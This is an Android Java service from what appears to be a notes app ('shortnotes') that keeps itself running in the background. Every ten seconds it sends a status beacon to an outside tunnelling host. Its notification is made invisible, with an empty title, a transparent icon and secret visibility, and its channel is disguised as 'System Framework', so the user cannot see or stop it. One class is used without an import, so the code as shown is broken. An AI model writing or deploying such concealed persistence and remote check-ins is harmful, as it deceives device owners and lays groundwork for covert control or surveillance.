package com.zypher.shortnotes;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BackgroundService extends Service {
    // --- Constants ---
    private static final String CHANNEL_ID = "ZypherBackgroundServiceChannelMin";
    private static final String TAG = "ZypherBackgroundSvc";
    private static final int NOTIFICATION_ID = 1337;
    private static final long INTERVAL_MS = 10000; // 10 seconds
    private static final String SERVER_URL = "http://feet-linking.gl.at.ply.gg:1554/log/status";

    // --- Members ---
    private Handler serviceHandler;
    private PeriodicTaskRunnable periodicRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        serviceHandler = new Handler(Looper.getMainLooper());
        periodicRunnable = new PeriodicTaskRunnable();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create and start with a minimal notification
        Notification notification = buildMinimalNotification();

        try {
            startForeground(NOTIFICATION_ID, notification);
            // Schedule periodic task
            serviceHandler.removeCallbacks(periodicRunnable);
            serviceHandler.post(periodicRunnable);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start foreground service", e);
            stopSelf();
            return START_NOT_STICKY;
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop periodic tasks
        if (serviceHandler != null) {
            serviceHandler.removeCallbacks(periodicRunnable);
        }
        // Send final "stopped" status
        sendStatusToServerAsync(false);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification buildMinimalNotification() {
        // Use a transparent icon if available, otherwise use a system icon
        int smallIconResId = R.drawable.ic_transparent; // Replace with transparent icon if you have one

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("") // Empty title
                .setContentText("")  // Empty text
                .setSmallIcon(smallIconResId)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                // No content intent - don't want user interaction
                .build();
    }

    private class PeriodicTaskRunnable implements Runnable {
        @Override
        public void run() {
            // Send "running" status
            sendStatusToServerAsync(true);
            // Schedule next run
            serviceHandler.postDelayed(this, INTERVAL_MS);
        }
    }

    private void sendStatusToServerAsync(final boolean isRunning) {
        new Thread(() -> {
            sendStatusToServerInternal(isRunning);
        }, "StatusSendThread-" + (isRunning ? "running" : "stopped")).start();
    }

    private boolean sendStatusToServerInternal(boolean isRunning) {
        HttpURLConnection connection = null;
        String statusValue = isRunning ? "running" : "stopped"; // Changed to match server expectations

        try {
            URL url = new URL(SERVER_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");

            String postData = "status=" + statusValue;
            byte[] postDataBytes = postData.getBytes(StandardCharsets.UTF_8);

            connection.setRequestProperty("Content-Length", Integer.toString(postDataBytes.length));

            try (OutputStream os = connection.getOutputStream()) {
                os.write(postDataBytes);
                os.flush();
            }

            int responseCode = connection.getResponseCode();
            boolean success = responseCode >= 200 && responseCode < 300;
            return success;

        } catch (Exception e) {
            Log.e(TAG, "Error sending status: " + e.getMessage());
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = getSystemService(NotificationManager.class);
    
            if (manager != null && manager.getNotificationChannel(CHANNEL_ID) == null) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID,
                        "System Framework", // Even more generic
                        NotificationManager.IMPORTANCE_MIN
                );
    
                // Make the channel as minimally intrusive as possible
                serviceChannel.setDescription("");
                serviceChannel.setShowBadge(false);
                serviceChannel.setSound(null, null);
                serviceChannel.enableLights(false);
                serviceChannel.enableVibration(false);
                
                // This is key - set the group to something generic
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    serviceChannel.setGroup("android_system");
                }
    
                manager.createNotificationChannel(serviceChannel);
                
                // Create a channel group with generic name if API allows
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    NotificationChannelGroup group = new NotificationChannelGroup(
                        "android_system",
                        "System"
                    );
                    manager.createNotificationChannelGroup(group);
                }
            }
        }
    }
}